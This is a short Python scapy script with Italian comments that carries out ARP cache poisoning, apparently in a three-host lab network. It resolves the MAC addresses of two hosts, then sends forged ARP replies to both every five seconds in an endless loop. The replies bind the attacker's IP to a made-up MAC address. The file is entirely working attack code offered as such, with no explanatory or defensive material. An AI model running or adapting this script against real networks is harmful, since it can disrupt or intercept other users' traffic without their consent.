from scapy.all import *
import time


def get_mac(IP):
    ans, unans = sr(ARP(pdst = IP, hwdst= "ff:ff:ff:ff:ff:ff", op=1), retry=2, timeout = 15)
    for snd,rcv in ans:
        return rcv[ARP].hwsrc
 
def poison(host1IP, host1MAC, host3IP, host3MAC, attackerMAC,attackerIP):
    send(ARP(op = 2, pdst = host1IP, psrc = attackerIP, hwdst=host1MAC, hwsrc=attackerMAC)) #invio a host1 un pacchetto ARP con associazione IP 10.0.0.2 con MAC inventato
    send(ARP(op = 2, pdst = host3IP, psrc = attackerIP, hwdst=host3MAC, hwsrc=attackerMAC)) #invio a host3 un pacchetto ARP con associazione IP 10.0.0.1 con MAC inventato
    
host1IP='10.0.0.1' #host1 della rete
host1MAC=get_mac(host1IP)
host3IP='10.0.0.3' #host3 della rete
host3MAC=get_mac(host3IP)
attackerIP='10.0.0.2' #host2 da cui viene lanciato l'attacco
attackerMAC='00:00:00:00:00:10' #inventato'

while 1:
    poison(host1IP,host1MAC,host3IP,host3MAC,attackerMAC,attackerIP)
    time.sleep(5)

